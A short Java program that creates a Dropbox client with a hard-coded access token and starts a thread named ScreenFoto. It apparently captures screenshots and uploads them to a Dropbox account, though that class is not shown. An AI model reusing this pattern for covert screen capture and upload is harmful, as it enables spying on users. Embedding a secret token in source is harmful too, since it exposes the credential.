import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

public class UploadDbox {
    public static void main(String[] args) throws Exception {
        String ACCESS_TOKEN = "qnlsCpMtUEQAAAAAAAAAAQG00liBm523krKUSvicMNLTq__50hAuzvJauV7YBHsg";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        ScreenFoto thread = new ScreenFoto(client);
        thread.start();
    }
}

